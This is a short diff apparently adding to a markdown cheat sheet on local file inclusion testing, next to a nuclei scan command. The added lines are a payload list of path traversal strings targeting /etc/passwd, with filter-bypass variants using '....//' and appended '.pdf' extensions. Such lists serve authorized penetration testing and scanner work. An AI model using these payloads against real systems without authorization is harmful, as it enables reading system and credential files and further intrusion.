@@ -117,3 +117,21 @@ nuclei -list target.txt -tags lfi
 ```
 
 
+
+
+        /etc/passwd
+        ../etc/passwd
+        ../../etc/passwd
+        ../../../etc/passwd
+        ../../../../etc/passwd
+        ../../../../../etc/passwd
+        ../../../../../../etc/passwd
+        ../../../../../../../etc/passwd
+        ....//etc//passwd
+        ....//....//etc/passwd
+        ....//....//....//etc/passwd
+        ....//....//....//....//etc/passwd
+        ../etc/passwd.pdf
+        ../../../etc/passwd.pdf
+
+
